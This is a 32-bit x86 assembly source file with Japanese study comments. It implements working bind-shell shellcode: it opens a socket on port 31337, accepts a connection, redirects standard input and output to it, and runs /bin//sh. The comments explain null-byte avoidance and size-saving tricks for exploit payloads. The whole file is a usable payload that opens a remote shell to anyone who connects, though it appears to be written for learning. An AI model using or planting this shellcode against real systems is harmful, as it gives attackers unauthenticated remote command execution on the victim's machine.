BITS 32

; ＃メモ
; - push -> popでの代入について
;       レジスタは下位1byteへのアクセス以外だとmov命令ではnullバイトが発生する
;       ただし1byteだけに値を代入しても上の桁の部分を設定できないので、その前に0で初期化しておく必要がある
;       push -> popだとxor -> movより1byte少なく32bit分レジスタに書き込むことができる
;
; - dup2のシステムコール発行の際にeaxを0クリアしないことについて
;       dup2の返り値は第二引数と同じなので、第二引数が256以上でなければレジスタの下位1byteを上書きするだけで問題なく値を代入できる

; s = socket(2,1,0)
    push BYTE 0x66 ; socketcallのシステムコール番号102(=0x66)
    pop eax
    cdq            ; 正の値の場合は符号拡張でedxをゼロにできる
    xor ebx, ebx
    inc ebx        ; 1 = SYS_SOCKET = soket()
    push edx       ; スタックに引数を逆順で格納 [ protocol = 0,
    push BYTE 0x1  ;                          SOCK_STREAM = 1,
    push BYTE 0x2  ;                          AF_INET = 2     ]
    mov ecx, esp   ; ecx = 引数の配列へのポインタ
    int 0x80       ; システムコール発行

; システムコールのあとはソケットファイル記述子がeaxに格納される

    xchg esi, eax   ; ソケットファイル記述子をesiに保存

; bind(s, [2, 31337, 0], 16)
    push BYTE 0x66   ; socketcall
    pop eax
    inc ebx          ; ebx = 2 = SYS_BIND = bind()
    push edx         ; sockaddr構造体を生成する                       { INADDR = 0,
    push WORD 0x697a ;     (逆順)                                     port = 31337,
    push WORD bx     ; ebxの下位2byteを16bit(=1word)としてスタックに格納  AF_INET = 2 }
    mov ecx, esp     ; サーバ構造体のポインタ
    push BYTE 16     ; argv:[ sizeof(server struct) = 16,
    push ecx         ;        server struct pointer,
    push esi         ;        socket file descripter      ]
    mov ecx, esp     ; ecx = 引数の配列へのポインタ
    int 0x80         ; システムコール発行 eax = 0(成功時)

; listen(s, 0)
    mov BYTE al, 0x66 ; socketcall:ここでは成功時に0でeaxが初期化されていることが保証されているのでmovを使ったほうが短くできる
    inc ebx
    inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
    push ebx          ; argv:[ backlog = 4(キューにためておける接続リクエストの数)
    push esi          ;        socket fd   ]
    mov ecx, esp      ; ecx = 引数の配列へのポインタ
    int 0x80          ; システムコール発行 eax = 0(成功時)

; accept(s, 0, 0)
    mov BYTE al, 0x66 ; socketcall:ここでは成功時に0でeaxが初期化されていることが保証されているのでmovを使ったほうが短くできる
    inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
    push edx          ; argv:[ socklen = 0,
    push edx          ;        sockaddr ptr = NULL,(クライアント情報の構造体のポインタを捨てる)
    push esi          ;        sock fd              ]
    mov ecx, esp      ; ecx = 引数の配列へのポインタ
    int 0x80          ; システムコール発行

; bup2(connected socket, [標準入出力ファイル記述子のすべて])
    xchg eax, ebx     ; ebxにソケットファイル記述子を移送、0x00000005をeaxに代入
    push BYTE 0x2
    pop ecx           ; ecxは2から開始
dup_loop:
    mov BYTE al, 0x3f ; dup2のシステムコール番号:63=0x3f
    int 0x80          ; dup2(c, ecx)
    dec ecx           ; 0に向かってカウントダウン
    jns dup_loop      ; サインフラグがセットされていない間、つまりecxが負じゃない場合

; execve(const char *filename, char *const argv[], char *const envp[])
    mov BYTE al, 11 ; execveはシステムコール番号11
    push edx        ; 文字列をNULLで終端(符号拡張cdqでedxは0クリアされている)
    push 0x68732f2f ; "//sh"をスタックにプッシュ
    push 0x6e69622f ; "/bin"をプッシュ
    mov ebx, esp    ; "/bin//sh"のアドレスをesp経由でebxに収納
    push edx        ; スタックに32bitのnull終端をプッシュする
    mov edx, esp    ; envp用の空の配列(中身の文字列へのアドレスはNULLだが配列自体のアドレスは有効)をedxに収納
    push ebx        ; null終端上にある文字列のアドレスをスタックにプッシュ
    mov ecx, esp    ; argv用の配列をecxに収納
    int 0x80        ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])